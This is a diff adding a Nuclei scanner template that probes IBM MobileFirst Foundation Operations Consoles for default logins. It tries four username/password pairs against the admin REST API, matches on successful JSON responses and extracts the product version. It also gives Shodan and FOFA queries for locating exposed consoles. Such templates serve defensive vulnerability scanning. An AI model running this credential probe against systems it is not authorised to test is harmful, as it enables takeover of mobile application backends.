@@ -1,0 +1,72 @@
+id: ibm-mfp-default-login
+
+info:
+  name: IBM MobileFirst Foundation - Default Credentials
+  author: Vishal Vishwakarma
+  severity: critical
+  description: |
+    Detected IBM MobileFirst Foundation Operations Console was found using default credentials. The administration REST API exposes full control over mobile application backends including adapter management, push notification infrastructure, OAuth security configuration, and application authenticity enforcement.
+  reference:
+    - https://www.ibm.com/docs/en/mfp/8.0?topic=console-mobilefirst-operations
+    - https://mobilefirstplatform.ibmcloud.com/tutorials/en/foundation/8.0/installation-configuration/production/server-configuration/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-798
+  metadata:
+    max-request: 4
+    verified: true
+    vendor: ibm
+    product: mobilefirst-foundation
+    shodan-query: http.title:"MobileFirst Operations Console"
+    fofa-query: title="MobileFirst Operations Console"
+  tags: ibm,mobilefirst,default-login
+
+http:
+  - raw:
+      - |
+        GET /mfpadmin/management-apis/2.0/runtimes HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+        Accept: application/json
+
+    payloads:
+      username:
+        - admin
+        - demo
+        - appcenteradmin
+        - root
+      password:
+        - admin
+        - demo
+        - admin
+        - passw0rd
+    attack: pitchfork
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "productVersion"
+          - "synchronizationStatus"
+          - "management-apis"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '"productVersion"\s*:\s*"([^"]+)"'
+# digest: 4b0a00483046022100c8ba1431c31eaf60de81866348c430a8e9369f187220d1dd7be7afd29fb426e8022100cc9017dfd7e4bb32a9fae2c82af53c6529d02da0fefe8840a52cd1aebbbf67a4:922c64590222798bb761d5b6d8e72950
